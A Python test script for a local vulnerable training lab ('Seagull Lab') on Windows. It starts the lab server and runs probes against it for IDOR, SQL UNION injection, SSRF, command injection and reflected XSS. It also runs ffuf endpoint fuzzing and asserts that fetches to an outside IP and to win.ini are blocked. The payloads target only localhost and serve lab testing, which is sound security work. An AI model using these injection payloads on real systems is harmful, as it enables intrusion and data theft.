"""Windows local fixture checks. Owns the server process and always stops it."""
import argparse
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:18080"
HERE = Path(__file__).resolve().parent
HTTP = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def request(path):
    try:
        response = HTTP.open(BASE + path, timeout=8)
    except urllib.error.HTTPError as exc:
        response = exc
    with response:
        return response.status, response.headers.get_content_type(), response.read().decode("utf-8")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--ffuf", required=True, help="ffuf executable path or command")
    parser.add_argument("--output-dir", type=Path, required=True, help="new, empty evidence directory")
    args = parser.parse_args()
    if os.name != "nt":
        parser.error("This fixture's ping command requires Windows")
    output = args.output_dir.resolve()
    if output.exists() and any(output.iterdir()):
        parser.error("output directory must be empty")
    output.mkdir(parents=True, exist_ok=True)
    # Refuse to probe an unrelated service already listening on the fixed port.
    with socket.socket() as probe:
        probe.bind(("127.0.0.1", 18080))
    rows = []

    def record(identity, name, response, passed):
        rows.append(dict(id=identity, finding=name, response=response, passed=bool(passed)))

    with (output / "server.log").open("w", encoding="utf-8") as log:
        server = subprocess.Popen([sys.executable, str(HERE / "lab_server.py"), "--output-dir", str(output)], stdout=log, stderr=log)
        try:
            for _ in range(50):
                if server.poll() is not None:
                    raise RuntimeError("fixture exited during startup")
                try:
                    if request("/")[2].find("Seagull Lab") >= 0:
                        break
                except OSError:
                    pass
                time.sleep(0.1)
            else:
                raise RuntimeError("fixture startup timed out")
            status, _, body = request("/api/note?id=201")
            record("L1", "IDOR fixture", body, status == 200 and json.loads(body).get("owner") == "admin")
            term = "x' UNION SELECT id, body FROM notes WHERE owner='admin' -- "
            status, _, body = request("/api/search?q=" + urllib.parse.quote(term))
            record("L2", "SQL UNION fixture", body, status == 200 and [201, "flag{seagull_idor_pwned}"] in json.loads(body).get("rows", []))
            status, _, body = request("/api/fetch?url=" + urllib.parse.quote(BASE + "/", safe=""))
            record("L3", "Server-side self-fetch", body, status == 200 and "Seagull Lab" in body)
            sample = (output / "sample.txt").as_uri()
            status, _, body = request("/api/fetch?url=" + urllib.parse.quote(sample, safe=""))
            record("L4", "Dedicated sample file fetch", body, status == 200 and body.strip() == "SEAGULL_FIXTURE_FILE_ONLY")
            status, _, body = request("/api/ping?who=" + urllib.parse.quote("127.0.0.1 & echo SEAGULL_CMDI_MARKER", safe=""))
            record("L5", "Fixed command injection marker", body, status == 200 and "SEAGULL_CMDI_MARKER" in json.loads(body).get("out", ""))
            payload = "<script>alert(1)</script>"
            status, content_type, body = request("/api/search?q=" + urllib.parse.quote(payload, safe=""))
            record("L6", "JSON reflection only; XSS not established", body, status == 200 and content_type == "application/json" and payload in json.loads(body).get("sql", ""))
            subprocess.run([args.ffuf, "-u", BASE + "/FUZZ", "-w", str(HERE / "words.txt"), "-mc", "all", "-t", "2", "-timeout", "8", "-s", "-o", str(output / "ffuf.raw.json"), "-of", "json"], check=True, capture_output=True, timeout=30)
            data = json.loads((output / "ffuf.raw.json").read_text(encoding="utf-8-sig"))
            hits = {r["input"]["FUZZ"]: r["status"] for r in data["results"]}
            record("L7", "Exact endpoint discovery", hits, all(hits.get(k) == v for k, v in {"api/search": 200, "api/fetch": 403, "api/ping": 200, "admin": 404}.items()) and len(hits) == 10)
            # Keep raw ffuf config local; export only endpoint/status evidence.
            (output / "ffuf.json").write_text(json.dumps({"results": hits}, indent=2) + "\n", encoding="utf-8")
            # Requests below test fixture containment, never contact these targets.
            assert request("/api/fetch?url=http://192.0.2.1/")[0] == 403
            assert request("/api/fetch?url=file:///C:/Windows/win.ini")[0] == 403
            assert request("/api/ping?who=example.invalid")[0] == 403
        finally:
            server.terminate()
            try:
                server.wait(timeout=8)
            except subprocess.TimeoutExpired:
                server.kill()
                server.wait()
            (output / "findings.jsonl").write_text("".join(json.dumps(row) + "\n" for row in rows), encoding="utf-8")
    passed = sum(row["passed"] for row in rows)
    print(f"pass={passed} fail={len(rows) - passed}; fixture stopped")
    return 0 if len(rows) == 7 and passed == 7 else 1


if __name__ == "__main__":
    sys.exit(main())
